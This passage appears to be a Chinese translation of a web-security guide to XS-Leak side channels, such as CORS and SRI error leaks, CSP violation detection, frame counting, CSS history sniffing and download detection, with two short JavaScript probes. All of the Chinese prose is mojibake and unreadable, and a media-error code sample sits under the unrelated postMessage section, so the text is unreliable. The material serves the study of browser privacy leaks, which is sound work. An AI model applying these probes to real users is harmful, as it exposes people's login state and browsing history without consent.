å¯ä»¥**åœ¨iframe**ä¸­**åŠ è½½é¡µé¢**å¹¶ä½¿ç”¨**`#id_value`**ä½¿é¡µé¢**èšç„¦åœ¨iframeçš„å…ƒç´ **ä¸Šï¼Œç„¶åå¦‚æœ**è§¦å‘`onblur`**ä¿¡å·ï¼ŒIDå…ƒç´ å­˜åœ¨ã€‚\
æ‚¨å¯ä»¥ä½¿ç”¨**`portal`**æ ‡ç­¾æ‰§è¡Œç›¸åŒçš„æ”»å‡»ã€‚

### postMessageå¹¿æ’­ <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **åŒ…å«æ–¹æ³•**ï¼šFramesï¼Œå¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šAPIä½¿ç”¨
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **æ‘˜è¦**ï¼šä»postMessageä¸­æ”¶é›†æ•æ„Ÿä¿¡æ¯æˆ–ä½¿ç”¨postMessagesçš„å­˜åœ¨ä½œä¸ºä¸€ä¸ªé¢„è¨€æœºï¼Œäº†è§£ç”¨æˆ·åœ¨é¡µé¢ä¸­çš„çŠ¶æ€ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š`ä»»ä½•ç›‘å¬æ‰€æœ‰postMessagesçš„ä»£ç ã€‚`

åº”ç”¨ç¨‹åºç»å¸¸åˆ©ç”¨[`postMessage`å¹¿æ’­](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)åœ¨ä¸åŒæºä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚ç„¶è€Œï¼Œå¦‚æœæœªæ­£ç¡®æŒ‡å®š`targetOrigin`å‚æ•°ï¼Œæ­¤æ–¹æ³•å¯èƒ½ä¼šæ— æ„ä¸­æš´éœ²**æ•æ„Ÿä¿¡æ¯**ï¼Œå…è®¸ä»»ä½•çª—å£æ¥æ”¶æ¶ˆæ¯ã€‚æ­¤å¤–ï¼Œæ¥æ”¶æ¶ˆæ¯æœ¬èº«å¯èƒ½å……å½“ä¸€ä¸ª**é¢„è¨€æœº**ï¼›ä¾‹å¦‚ï¼ŒæŸäº›æ¶ˆæ¯å¯èƒ½ä»…å‘é€ç»™å·²ç™»å½•çš„ç”¨æˆ·ã€‚å› æ­¤ï¼Œè¿™äº›æ¶ˆæ¯çš„å­˜åœ¨æˆ–ä¸å­˜åœ¨å¯ä»¥æ­ç¤ºæœ‰å…³ç”¨æˆ·çŠ¶æ€æˆ–èº«ä»½çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä»–ä»¬æ˜¯å¦å·²ç»è®¤è¯ã€‚

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### CORSé”™è¯¯

- **åŒ…å«æ–¹æ³•**ï¼šFetch API
- **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
- **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **æ‘˜è¦**ï¼šåœ¨å®‰å…¨æ–­è¨€ï¼ˆSAï¼‰ä¸­ï¼ŒCORSé”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æš´éœ²äº†é‡å®šå‘è¯·æ±‚çš„å®Œæ•´URLã€‚
- **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

è¿™ç§æŠ€æœ¯ä½¿æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡åˆ©ç”¨åŸºäºWebkitçš„æµè§ˆå™¨å¤„ç†CORSè¯·æ±‚çš„æ–¹å¼ï¼Œ**æå–è·¨æºç«™ç‚¹é‡å®šå‘çš„ç›®æ ‡**ã€‚å…·ä½“æ¥è¯´ï¼Œå½“å‘å‘å‡ºåŸºäºç”¨æˆ·çŠ¶æ€çš„é‡å®šå‘çš„ç›®æ ‡ç«™ç‚¹å‘é€**å¯ç”¨CORSçš„è¯·æ±‚**ï¼Œå¹¶ä¸”æµè§ˆå™¨éšåæ‹’ç»è¯¥è¯·æ±‚æ—¶ï¼Œé”™è¯¯æ¶ˆæ¯ä¸­å°†æŠ«éœ²**é‡å®šå‘ç›®æ ‡çš„å®Œæ•´URL**ã€‚è¿™ç§æ¼æ´ä¸ä»…ä¼šæ­ç¤ºé‡å®šå‘çš„äº‹å®ï¼Œè¿˜ä¼šæš´éœ²é‡å®šå‘çš„ç«¯ç‚¹ä»¥åŠå¯èƒ½åŒ…å«çš„ä»»ä½•**æ•æ„ŸæŸ¥è¯¢å‚æ•°**ã€‚

### SRIé”™è¯¯

- **åŒ…å«æ–¹æ³•**ï¼šFetch API
- **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
- **æ›´å¤šä¿¡æ¯**ï¼š[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **æ‘˜è¦**ï¼šåœ¨å®‰å…¨æ–­è¨€ï¼ˆSAï¼‰ä¸­ï¼ŒSRIé”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æš´éœ²äº†é‡å®šå‘è¯·æ±‚çš„å®Œæ•´URLã€‚
- **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

æ”»å‡»è€…å¯ä»¥åˆ©ç”¨**å†—é•¿çš„é”™è¯¯æ¶ˆæ¯**æ¨æ–­è·¨æºå“åº”çš„å¤§å°ã€‚è¿™æ˜¯ç”±äºå­èµ„æºå®Œæ•´æ€§ï¼ˆSRIï¼‰çš„æœºåˆ¶ï¼Œå®ƒä½¿ç”¨å®Œæ•´æ€§å±æ€§éªŒè¯ä»CDNç­‰åœ°æ–¹è·å–çš„èµ„æºæ˜¯å¦æœªè¢«ç¯¡æ”¹ã€‚ä¸ºäº†ä½¿SRIåœ¨è·¨æºèµ„æºä¸Šå·¥ä½œï¼Œè¿™äº›èµ„æºå¿…é¡»æ˜¯**å¯ç”¨CORSçš„**ï¼›å¦åˆ™ï¼Œå®ƒä»¬ä¸ä¼šå—åˆ°å®Œæ•´æ€§æ£€æŸ¥ã€‚åœ¨å®‰å…¨æ–­è¨€ï¼ˆSAï¼‰ä¸­ï¼Œå°±åƒCORSé”™è¯¯XS-Leakä¸€æ ·ï¼Œå¯ä»¥åœ¨å¸¦æœ‰å®Œæ•´æ€§å±æ€§çš„fetchè¯·æ±‚å¤±è´¥åæ•è·é”™è¯¯æ¶ˆæ¯ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å°†å®Œæ•´æ€§å±æ€§çš„**è™šå‡å“ˆå¸Œå€¼**åˆ†é…ç»™ä»»ä½•è¯·æ±‚æ¥æ•…æ„**è§¦å‘æ­¤é”™è¯¯**ã€‚åœ¨SAä¸­ï¼Œç”±æ­¤äº§ç”Ÿçš„é”™è¯¯æ¶ˆæ¯æ— æ„ä¸­æ­ç¤ºäº†æ‰€è¯·æ±‚èµ„æºçš„å†…å®¹é•¿åº¦ã€‚è¿™ç§ä¿¡æ¯æ³„æ¼ä½¿æ”»å‡»è€…èƒ½å¤Ÿè¾¨åˆ«å“åº”å¤§å°çš„å˜åŒ–ï¼Œä¸ºå¤æ‚çš„XS-Leakæ”»å‡»é“ºå¹³äº†é“è·¯ã€‚

### CSPè¿è§„/æ£€æµ‹

- **åŒ…å«æ–¹æ³•**ï¼šå¼¹å‡ºçª—å£
- **å¯æ£€æµ‹å·®å¼‚**ï¼šçŠ¶æ€ç 
- **æ›´å¤šä¿¡æ¯**ï¼š[https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **æ‘˜è¦**ï¼šå¦‚æœæˆ‘ä»¬è®¿é—®çš„å—å®³è€…ç½‘ç«™åªå…è®¸CSPä¸­çš„åŸŸåå°è¯•é‡å®šå‘åˆ°ä¸åŒçš„åŸŸåï¼ŒCSPå°†è§¦å‘å¯æ£€æµ‹çš„é”™è¯¯ã€‚
- **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leakå¯ä»¥ä½¿ç”¨CSPæ£€æµ‹è·¨æºç«™ç‚¹æ˜¯å¦è¢«é‡å®šå‘åˆ°ä¸åŒçš„æºã€‚æ­¤æ³„æ¼å¯ä»¥æ£€æµ‹é‡å®šå‘ï¼Œä½†å¦å¤–ï¼Œé‡å®šå‘ç›®æ ‡çš„åŸŸåä¹Ÿä¼šæ³„æ¼ã€‚è¿™ç§æ”»å‡»çš„åŸºæœ¬æ€æƒ³æ˜¯**åœ¨æ”»å‡»è€…ç«™ç‚¹ä¸Šå…è®¸ç›®æ ‡åŸŸå**ã€‚ä¸€æ—¦å‘ç›®æ ‡åŸŸåå‘å‡ºè¯·æ±‚ï¼Œå®ƒ**é‡å®šå‘**åˆ°ä¸€ä¸ªè·¨æºåŸŸã€‚**CSPé˜»æ­¢**å¯¹å…¶çš„è®¿é—®ï¼Œå¹¶åˆ›å»ºä¸€ä¸ª**ç”¨ä½œæ³„æ¼æŠ€æœ¯çš„è¿è§„æŠ¥å‘Š**ã€‚æ ¹æ®æµè§ˆå™¨çš„ä¸åŒï¼Œ**æ­¤æŠ¥å‘Šå¯èƒ½æ³„éœ²é‡å®šå‘çš„ç›®æ ‡ä½ç½®**ã€‚\
ç°ä»£æµè§ˆå™¨ä¸ä¼šæŒ‡ç¤ºé‡å®šå‘åˆ°çš„URLï¼Œä½†æ‚¨ä»ç„¶å¯ä»¥æ£€æµ‹åˆ°è§¦å‘äº†è·¨æºé‡å®šå‘ã€‚
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### å¸§è®¡æ•°

* **åŒ…å«æ–¹æ³•**ï¼šå¸§ã€å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **æ‘˜è¦**ï¼šé€šè¿‡æ£€æŸ¥ `window.length` å±æ€§æ¥è¯„ä¼° iframe å…ƒç´ çš„æ•°é‡ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

é€šè¿‡ `iframe` æˆ– `window.open` æ‰“å¼€çš„ç½‘é¡µä¸­çš„ **å¸§æ•°** å¯èƒ½æœ‰åŠ©äºè¯†åˆ«ç”¨æˆ·åœ¨è¯¥é¡µé¢ä¸Šçš„ **çŠ¶æ€**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœé¡µé¢å§‹ç»ˆå…·æœ‰ç›¸åŒæ•°é‡çš„å¸§ï¼ŒæŒç»­æ£€æŸ¥å¸§æ•°å¯èƒ½æœ‰åŠ©äºè¯†åˆ«å¯èƒ½æ³„éœ²ä¿¡æ¯çš„ **æ¨¡å¼**ã€‚

ä¾‹å¦‚ï¼Œåœ¨ Chrome ä¸­ï¼Œå¯ä»¥é€šè¿‡ **å¸§è®¡æ•°** æ£€æµ‹åˆ° **PDF**ï¼Œå› ä¸ºå†…éƒ¨ä½¿ç”¨äº† `embed`ã€‚æœ‰ä¸€äº›[æ‰“å¼€ URL å‚æ•°](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113)å¯ä»¥å¯¹å†…å®¹è¿›è¡Œä¸€äº›æ§åˆ¶ï¼Œå¦‚ `zoom`ã€`view`ã€`page`ã€`toolbar`ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™ç§æŠ€æœ¯å¯èƒ½ä¼šå¾ˆæœ‰è¶£ã€‚

### HTMLElements

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **æ‘˜è¦**ï¼šè¯»å–æ³„éœ²çš„å€¼ä»¥åŒºåˆ†ä¸¤ç§å¯èƒ½çš„çŠ¶æ€
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

é€šè¿‡ HTML å…ƒç´ æ³„éœ²ä¿¡æ¯æ˜¯ç½‘ç»œå®‰å…¨ä¸­çš„ä¸€ä¸ªé—®é¢˜ï¼Œç‰¹åˆ«æ˜¯å½“åŸºäºç”¨æˆ·ä¿¡æ¯ç”ŸæˆåŠ¨æ€åª’ä½“æ–‡ä»¶æˆ–æ·»åŠ æ°´å°ä»¥æ›´æ”¹åª’ä½“å¤§å°æ—¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œé€šè¿‡åˆ†ææŸäº› HTML å…ƒç´ æš´éœ²çš„ä¿¡æ¯æ¥åŒºåˆ†å¯èƒ½çš„çŠ¶æ€ã€‚

### HTML å…ƒç´ æ³„éœ²çš„ä¿¡æ¯

- **HTMLMediaElement**ï¼šæ­¤å…ƒç´ æ˜¾ç¤ºåª’ä½“çš„ `duration` å’Œ `buffered` æ—¶é—´ï¼Œå¯ä»¥é€šè¿‡å…¶ API è®¿é—®ã€‚
[é˜…è¯»æ›´å¤šå…³äº HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**ï¼šå®ƒå…¬å¼€ `videoHeight` å’Œ `videoWidth`ã€‚åœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œè¿˜æä¾›äº†é¢å¤–çš„å±æ€§ï¼Œå¦‚ `webkitVideoDecodedByteCount`ã€`webkitAudioDecodedByteCount` å’Œ `webkitDecodedFrameCount`ï¼Œæä¾›äº†æœ‰å…³åª’ä½“å†…å®¹çš„æ›´æ·±å…¥ä¿¡æ¯ã€‚
[é˜…è¯»æ›´å¤šå…³äº HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**ï¼šæ­¤å‡½æ•°æä¾›æœ‰å…³è§†é¢‘æ’­æ”¾è´¨é‡çš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬ `totalVideoFrames`ï¼Œå¯ä»¥æŒ‡ç¤ºå¤„ç†çš„è§†é¢‘æ•°æ®é‡ã€‚
[é˜…è¯»æ›´å¤šå…³äº getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**ï¼šæ­¤å…ƒç´ æ³„éœ²å›¾åƒçš„ `height` å’Œ `width`ã€‚ä½†æ˜¯ï¼Œå¦‚æœå›¾åƒæ— æ•ˆï¼Œåˆ™è¿™äº›å±æ€§å°†è¿”å› 0ï¼Œå¹¶ä¸” `image.decode()` å‡½æ•°å°†è¢«æ‹’ç»ï¼Œè¡¨ç¤ºæœªèƒ½æ­£ç¡®åŠ è½½å›¾åƒã€‚
[é˜…è¯»æ›´å¤šå…³äº HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS å±æ€§

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **æ‘˜è¦**ï¼šè¯†åˆ«ä¸ç”¨æˆ·çŠ¶æ€æˆ–çŠ¶æ€ç›¸å…³çš„ç½‘ç«™æ ·å¼å˜åŒ–ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web åº”ç”¨ç¨‹åºå¯èƒ½æ ¹æ®ç”¨æˆ·çŠ¶æ€æ›´æ”¹ **ç½‘ç«™æ ·å¼**ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ **HTML é“¾æ¥å…ƒç´ ** åœ¨æ”»å‡»è€…é¡µé¢ä¸ŠåµŒå…¥è·¨æº CSS æ–‡ä»¶ï¼Œå¹¶å°†è§„åˆ™åº”ç”¨äºæ”»å‡»è€…é¡µé¢ã€‚å¦‚æœé¡µé¢åŠ¨æ€æ›´æ”¹è¿™äº›è§„åˆ™ï¼Œæ”»å‡»è€…å¯ä»¥æ ¹æ®ç”¨æˆ·çŠ¶æ€æ£€æµ‹è¿™äº›å·®å¼‚ã€‚\
ä½œä¸ºä¸€ç§æ³„æ¼æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ `window.getComputedStyle` æ–¹æ³•æ¥ **è¯»å–ç‰¹å®š HTML å…ƒç´ çš„ CSS** å±æ€§ã€‚å› æ­¤ï¼Œå¦‚æœå·²çŸ¥å—å½±å“çš„å…ƒç´ å’Œå±æ€§åç§°ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä»»æ„ CSS å±æ€§ã€‚

### CSS å†å²

* **åŒ…å«æ–¹æ³•**ï¼šHTML å…ƒç´ 
* **å¯æ£€æµ‹å·®å¼‚**ï¼šé¡µé¢å†…å®¹
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **æ‘˜è¦**ï¼šæ£€æµ‹ `:visited` æ ·å¼æ˜¯å¦åº”ç”¨äº URLï¼ŒæŒ‡ç¤ºå…¶å·²è¢«è®¿é—®è¿‡
* **ä»£ç ç¤ºä¾‹**ï¼š[http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
æ ¹æ®[**è¿™é‡Œ**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/)çš„è¯´æ³•ï¼Œåœ¨æ— å¤´ Chrome ä¸­è¿™ä¸èµ·ä½œç”¨ã€‚
{% endhint %}

CSS `:visited` é€‰æ‹©å™¨ç”¨äºåœ¨ç”¨æˆ·å…ˆå‰è®¿é—®è¿‡çš„ URL ä¸Šåº”ç”¨ä¸åŒçš„æ ·å¼ã€‚è¿‡å»ï¼Œå¯ä»¥ä½¿ç”¨ `getComputedStyle()` æ–¹æ³•æ¥è¯†åˆ«è¿™äº›æ ·å¼å·®å¼‚ã€‚ç„¶è€Œï¼Œç°ä»£æµè§ˆå™¨å·²ç»å®æ–½äº†å®‰å…¨æªæ–½ï¼Œé˜²æ­¢æ­¤æ–¹æ³•æ­ç¤ºé“¾æ¥çŠ¶æ€ã€‚è¿™äº›æªæ–½åŒ…æ‹¬å§‹ç»ˆè¿”å›è®¡ç®—æ ·å¼ï¼Œå°±åƒé“¾æ¥å·²è¢«è®¿é—®ä¸€æ ·ï¼Œå¹¶é™åˆ¶å¯ä»¥ä½¿ç”¨ `:visited` é€‰æ‹©å™¨åº”ç”¨çš„æ ·å¼ã€‚

å°½ç®¡å­˜åœ¨è¿™äº›é™åˆ¶ï¼Œä»ç„¶å¯ä»¥é—´æ¥åœ°è¾¨åˆ«é“¾æ¥çš„è®¿é—®çŠ¶æ€ã€‚ä¸€ç§æŠ€æœ¯æ¶‰åŠæ¬ºéª—ç”¨æˆ·ä¸å— CSS å½±å“çš„åŒºåŸŸè¿›è¡Œäº¤äº’ï¼Œç‰¹åˆ«æ˜¯åˆ©ç”¨ `mix-blend-mode` å±æ€§ã€‚è¯¥å±æ€§å…è®¸å…ƒç´ ä¸å…¶èƒŒæ™¯æ··åˆï¼Œæ ¹æ®ç”¨æˆ·äº¤äº’å¯èƒ½æ˜¾ç¤ºå·²è®¿é—®çŠ¶æ€ã€‚

æ­¤å¤–ï¼Œå¯ä»¥é€šè¿‡åˆ©ç”¨é“¾æ¥çš„æ¸²æŸ“æ—¶é—´å®ç°æ— éœ€ç”¨æˆ·äº¤äº’çš„æ£€æµ‹ã€‚ç”±äºæµè§ˆå™¨å¯èƒ½ä»¥ä¸åŒæ–¹å¼æ¸²æŸ“å·²è®¿é—®å’Œæœªè®¿é—®çš„é“¾æ¥ï¼Œè¿™å¯èƒ½å¯¼è‡´æ¸²æŸ“æ—¶å‡ºç°å¯æµ‹é‡çš„æ—¶é—´å·®å¼‚ã€‚åœ¨ Chromium ç¼ºé™·æŠ¥å‘Šä¸­æåˆ°äº†ä¸€ä¸ªæ¦‚å¿µéªŒè¯ï¼ˆPoCï¼‰ï¼Œæ¼”ç¤ºäº†ä½¿ç”¨å¤šä¸ªé“¾æ¥æ”¾å¤§æ—¶é—´å·®å¼‚çš„æŠ€æœ¯ï¼Œä»è€Œé€šè¿‡æ—¶é—´åˆ†æä½¿å·²è®¿é—®çŠ¶æ€å¯æ£€æµ‹ã€‚

æœ‰å…³è¿™äº›å±æ€§å’Œæ–¹æ³•çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·è®¿é—®å®ƒä»¬çš„æ–‡æ¡£é¡µé¢ï¼š
- `:visited`ï¼š[MDN æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`ï¼š[MDN æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`ï¼š[MDN æ–‡æ¡£](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame æ³„æ¼

* **åŒ…å«æ–¹æ³•**ï¼šå¸§
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **æ‘˜è¦**ï¼šåœ¨ Google Chrome ä¸­ï¼Œå½“ç”±äº X-Frame-Options é™åˆ¶è€Œé˜»æ­¢é¡µé¢åµŒå…¥åˆ°è·¨æºç«™ç‚¹æ—¶ï¼Œä¼šæ˜¾ç¤ºä¸“ç”¨é”™è¯¯é¡µé¢ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

åœ¨ Chrome ä¸­ï¼Œå¦‚æœé¡µé¢çš„ `X-Frame-Options` æ ‡å¤´è®¾ç½®ä¸º "deny" æˆ– "same-origin" å¹¶ä½œä¸ºå¯¹è±¡åµŒå…¥ï¼Œå°†æ˜¾ç¤ºé”™è¯¯é¡µé¢ã€‚ä¸ iframe æˆ–å…¶ä»–æµè§ˆå™¨ä¸åŒï¼ŒChrome ä¸ºæ­¤å¯¹è±¡çš„ `contentDocument` å±æ€§è¿”å›ä¸€ä¸ªç©ºæ–‡æ¡£å¯¹è±¡ï¼ˆè€Œä¸æ˜¯ `null`ï¼‰ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ£€æµ‹ç©ºæ–‡æ¡£ï¼Œå¯èƒ½æ­ç¤ºæœ‰å…³ç”¨æˆ·çŠ¶æ€çš„ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯å¦‚æœå¼€å‘äººå‘˜ä¸ä¸€è‡´åœ°è®¾ç½® X-Frame-Options æ ‡å¤´ï¼Œç»å¸¸å¿½è§†é”™è¯¯é¡µé¢ã€‚æ„è¯†åˆ°å¹¶ä¸€è‡´åº”ç”¨å®‰å…¨æ ‡å¤´å¯¹äºé˜²æ­¢æ­¤ç±»æ³„æ¼è‡³å…³é‡è¦ã€‚

### ä¸‹è½½æ£€æµ‹

* **åŒ…å«æ–¹æ³•**ï¼šå¸§ã€å¼¹å‡ºçª—å£
* **å¯æ£€æµ‹å·®å¼‚**ï¼šæ ‡å¤´
* **æ›´å¤šä¿¡æ¯**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **æ‘˜è¦**ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ iframe åŒºåˆ†æ–‡ä»¶ä¸‹è½½ï¼›iframe çš„æŒç»­å¯è®¿é—®æ€§æ„å‘³ç€æˆåŠŸçš„æ–‡ä»¶ä¸‹è½½ã€‚
* **ä»£ç ç¤ºä¾‹**ï¼š[https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

`Content-Disposition` æ ‡å¤´ï¼Œç‰¹åˆ«æ˜¯ `Content-Disposition: attachment`ï¼ŒæŒ‡ç¤ºæµè§ˆå™¨ä¸‹è½½å†…å®¹è€Œä¸æ˜¯å†…è”æ˜¾ç¤ºã€‚è¿™ç§è¡Œä¸ºå¯ç”¨äºæ£€æµ‹ç”¨æˆ·æ˜¯å¦å¯ä»¥è®¿é—®è§¦å‘æ–‡ä»¶ä¸‹è½½çš„é¡µé¢ã€‚åœ¨åŸºäº Chromium çš„æµè§ˆå™¨ä¸­ï¼Œæœ‰ä¸€äº›æŠ€æœ¯å¯ç”¨äºæ£€æµ‹æ­¤ä¸‹è½½è¡Œä¸ºï¼š

1. **ä¸‹è½½æ ç›‘æ§**ï¼š
- å½“åœ¨åŸºäº Chromium çš„æµè§ˆå™¨ä¸­ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¼šåœ¨æµè§ˆå™¨çª—å£åº•éƒ¨å‡ºç°ä¸‹è½½æ ã€‚
- é€šè¿‡ç›‘è§†çª—å£é«˜åº¦çš„å˜åŒ–ï¼Œæ”»å‡»è€…å¯ä»¥æ¨æ–­ä¸‹è½½æ çš„å‡ºç°ï¼Œè¡¨æ˜å·²å¯åŠ¨ä¸‹è½½ã€‚

2. **ä½¿ç”¨ iframe è¿›è¡Œä¸‹è½½å¯¼èˆª**ï¼š
- å½“é¡µé¢ä½¿ç”¨ `Content-Disposition: attachment` æ ‡å¤´è§¦å‘æ–‡ä»¶ä¸‹è½½æ—¶ï¼Œä¸ä¼šå¯¼è‡´å¯¼èˆªäº‹ä»¶ã€‚
- é€šè¿‡åœ¨ iframe ä¸­åŠ è½½å†…å®¹å¹¶ç›‘è§†å¯¼èˆªäº‹ä»¶ï¼Œå¯ä»¥æ£€æŸ¥å†…å®¹è®¾ç½®æ˜¯å¦å¯¼è‡´æ–‡ä»¶ä¸‹è½½ï¼ˆæ— å¯¼èˆªï¼‰ã€‚

3. **ä¸ä½¿ç”¨ iframe è¿›è¡Œä¸‹è½½å¯¼èˆª**ï¼š
- ä¸ iframe æŠ€æœ¯ç±»ä¼¼ï¼Œæ­¤æ–¹æ³•æ¶‰åŠä½¿ç”¨ `window.open` è€Œä¸æ˜¯ iframeã€‚
